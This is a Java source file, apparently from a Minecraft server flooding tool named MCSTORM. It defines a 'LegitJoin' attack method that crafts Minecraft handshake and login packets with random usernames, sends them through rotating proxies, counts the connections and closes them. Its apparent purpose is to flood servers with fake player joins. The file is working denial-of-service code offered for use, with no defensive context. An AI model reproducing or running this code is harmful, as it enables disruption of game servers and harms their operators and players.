package io.MCSTORM.methods;


import io.MCSTORM.Main;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.io.IOException;
import java.util.Random;


public class LegitJoin
        implements Method {


    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {

        while ((paramInt & 0xFFFFFF80) != 0) {
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;

        }

        out.writeByte(paramInt);

    }


    private String randomString(int len) {

        int leftLimit = 97;

        int rightLimit = 122;

        int targetStringLength = len;

        Random random = new Random();

        StringBuilder buffer = new StringBuilder(targetStringLength);

        for (int i = 0; i < targetStringLength; i++) {

            int randomLimitedInt = leftLimit + (int) (random.nextFloat() * (rightLimit - leftLimit + 1));
            buffer.append((char) randomLimitedInt);

        }

        return buffer.toString();

    }


    public void accept(Channel channel, ProxyLoader.Proxy proxy) {

        ByteBuf b = Unpooled.buffer();

        ByteBufOutputStream buffer = new ByteBufOutputStream(b);

        Random random = new Random();

        try {
            int nickLength = 4 + (int) (random.nextFloat() * 13.0F);
            buffer.writeByte(4 + Main.protocolLength + Main.origIP.length());
            buffer.writeByte(0);
            writeVarInt(buffer, Main.protcolID);
            buffer.writeByte(Main.origIP.length());
            buffer.writeBytes(Main.origIP);
            buffer.writeShort(Main.port & 0xFFFF);
            buffer.writeByte(2);
            buffer.writeByte(2 + nickLength);
            buffer.writeByte(0);
            buffer.writeByte(nickLength);
            buffer.writeBytes(randomString(nickLength));

            buffer.close();

        } catch (IOException e) {
            e.printStackTrace();

        }

        channel.writeAndFlush(b);

        NettyBootstrap.integer++;

        NettyBootstrap.totalConnections++;

        channel.close();

    }

}


